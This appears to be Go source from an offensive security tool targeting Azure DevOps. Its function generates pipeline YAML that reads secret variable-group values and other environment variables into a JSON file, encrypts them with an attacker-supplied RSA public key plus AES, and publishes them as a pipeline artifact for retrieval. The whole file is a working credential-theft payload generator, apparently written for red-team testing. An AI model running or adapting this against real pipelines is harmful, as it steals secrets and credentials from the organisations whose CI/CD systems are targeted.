package common

import (
	"fmt"
	"sort"
	"strings"

	"github.com/praetorian-inc/trajan/pkg/azuredevops"
)

// GenerateEncryptedPipelineYAML generates pipeline YAML that collects secrets,
// encrypts them with RSA+AES hybrid encryption, and uploads as pipeline artifacts.
// publicKeyPEM is the RSA public key in PEM format to embed in the pipeline.
// groups are the discovered variable groups with their secret variable metadata.
// includeEnvVars controls whether non-system environment variables are collected
// into the __environment_variables__ section (false when targeting a single group).
func GenerateEncryptedPipelineYAML(publicKeyPEM string, groups []azuredevops.VariableGroup, includeEnvVars bool) string {
	var sb strings.Builder

	sb.WriteString("trigger: none\n\npool:\n  vmImage: 'ubuntu-latest'\n\n")

	// Variable group references
	if len(groups) > 0 {
		sb.WriteString(GenerateVariableGroupsYAML(groups))
	}

	// Collect variable names: all vars for Python collection, secret vars for env mapping
	allVarNames := collectAllVarNames(groups)
	secretVarNames := collectSecretVarNames(groups)

	// Build a mapping from variable name to group name for structured output
	varToGroup := buildVarToGroupMap(groups)

	// Step 1: Collect secrets into output.json using Python3 with structured JSON
	sb.WriteString("steps:\n")
	sb.WriteString("  - script: |\n")

	sb.WriteString("      python3 -c \"\n")
	sb.WriteString("      import os, json\n")

	if len(allVarNames) > 0 {
		// Known vars from discovered groups — collect them by group
		fmt.Fprintf(&sb, "      var_to_group = %s\n", pythonDictLiteral(varToGroup))
		sb.WriteString("      result = {}\n")
		sb.WriteString("      for var_name, group_name in var_to_group.items():\n")
		sb.WriteString("          val = os.environ.get(var_name, '')\n")
		sb.WriteString("          if group_name not in result:\n")
		sb.WriteString("              result[group_name] = {}\n")
		sb.WriteString("          result[group_name][var_name] = val\n")
	} else {
		sb.WriteString("      result = {}\n")
	}

	if includeEnvVars {
		// Collect remaining non-system env vars into __environment_variables__
		sb.WriteString("      skip_prefixes = ('SYSTEM_','BUILD_','AGENT_','TF_','PIPELINE_','RESOURCES_','ENDPOINT_','SECUREFILE_','VSTS_','TASK_','INPUT_','MSDEPLOY_')\n")
		sb.WriteString("      skip_names = {'PATH','HOME','USER','SHELL','TERM','PWD','HOSTNAME','LANG','LC_ALL','LOGNAME','MAIL','SHLVL','_'}\n")

		if len(allVarNames) > 0 {
			fmt.Fprintf(&sb, "      known_vars = set(%s)\n", pythonStringList(allVarNames))
		} else {
			sb.WriteString("      known_vars = set()\n")
		}

		sb.WriteString("      env_vars = {}\n")
		sb.WriteString("      for k, v in os.environ.items():\n")
		sb.WriteString("          if k not in skip_names and not any(k.startswith(p) for p in skip_prefixes) and k not in known_vars:\n")
		sb.WriteString("              env_vars[k] = v\n")
		sb.WriteString("      if env_vars:\n")
		sb.WriteString("          result['__environment_variables__'] = env_vars\n")
	}

	sb.WriteString("      with open('output.json', 'w') as f:\n")
	sb.WriteString("          json.dump(result, f, indent=2)\n")
	sb.WriteString("      \"\n")

	sb.WriteString("    displayName: 'Collect Secrets'\n")

	// Add env block for secret variables (maps pipeline variables to env vars)
	if len(secretVarNames) > 0 {
		sb.WriteString("    env:\n")
		for _, name := range secretVarNames {
			fmt.Fprintf(&sb, "      %s: $(%s)\n", name, name)
		}
	}

	// Step 2: Encrypt with AES+RSA and publish artifact
	sb.WriteString("  - script: |\n")
	sb.WriteString("      aes_key=$(openssl rand -hex 32 | tr -d '\\n')\n")
	sb.WriteString("      openssl enc -aes-256-cbc -pbkdf2 -in output.json -out output_updated.json -pass pass:$aes_key\n")
	sb.WriteString("      echo \"$PUBKEY\" > /tmp/pubkey.pem\n")
	sb.WriteString("      echo -n $aes_key | openssl pkeyutl -encrypt -pubin -inkey /tmp/pubkey.pem -pkeyopt rsa_padding_mode:pkcs1 -out lookup.txt 2>/dev/null\n")
	sb.WriteString("      rm -f /tmp/pubkey.pem output.json\n")
	sb.WriteString("      mkdir -p $(Build.ArtifactStagingDirectory)/encrypted\n")
	sb.WriteString("      mv output_updated.json lookup.txt $(Build.ArtifactStagingDirectory)/encrypted/\n")
	sb.WriteString("    displayName: 'Encrypt Secrets'\n")
	sb.WriteString("    env:\n")
	sb.WriteString("      PUBKEY: |\n")

	// Embed the public key PEM, indented under env
	for _, line := range strings.Split(strings.TrimSpace(publicKeyPEM), "\n") {
		fmt.Fprintf(&sb, "        %s\n", line)
	}

	// Step 3: Publish encrypted artifacts
	sb.WriteString("  - task: PublishPipelineArtifact@1\n")
	sb.WriteString("    inputs:\n")
	sb.WriteString("      targetPath: '$(Build.ArtifactStagingDirectory)/encrypted'\n")
	sb.WriteString("      artifact: 'encrypted-secrets'\n")
	sb.WriteString("      publishLocation: 'pipeline'\n")
	sb.WriteString("    displayName: 'Upload Encrypted Artifacts'\n")

	return sb.String()
}

// buildVarToGroupMap creates a mapping from variable name to group name.
func buildVarToGroupMap(groups []azuredevops.VariableGroup) map[string]string {
	result := make(map[string]string)
	for _, group := range groups {
		for varName := range group.Variables {
			result[varName] = group.Name
		}
	}
	return result
}

// collectSecretVarNames extracts and sorts all secret variable names from variable groups.
func collectSecretVarNames(groups []azuredevops.VariableGroup) []string {
	seen := make(map[string]bool)
	for _, group := range groups {
		for varName, varVal := range group.Variables {
			if varVal.IsSecret {
				seen[varName] = true
			}
		}
	}

	names := make([]string, 0, len(seen))
	for name := range seen {
		names = append(names, name)
	}
	sort.Strings(names)
	return names
}

// collectAllVarNames extracts and sorts all variable names from variable groups,
// regardless of whether they are marked as secret.
func collectAllVarNames(groups []azuredevops.VariableGroup) []string {
	seen := make(map[string]bool)
	for _, group := range groups {
		for varName := range group.Variables {
			seen[varName] = true
		}
	}

	names := make([]string, 0, len(seen))
	for name := range seen {
		names = append(names, name)
	}
	sort.Strings(names)
	return names
}

// pythonStringList formats a Go string slice as a Python list literal.
func pythonStringList(items []string) string {
	quoted := make([]string, len(items))
	for i, item := range items {
		quoted[i] = fmt.Sprintf("'%s'", item)
	}
	return "[" + strings.Join(quoted, ", ") + "]"
}

// pythonDictLiteral formats a Go map[string]string as a Python dict literal.
// Keys are sorted for deterministic output.
func pythonDictLiteral(m map[string]string) string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	sort.Strings(keys)

	pairs := make([]string, len(keys))
	for i, k := range keys {
		pairs[i] = fmt.Sprintf("'%s': '%s'", k, m[k])
	}
	return "{" + strings.Join(pairs, ", ") + "}"
}
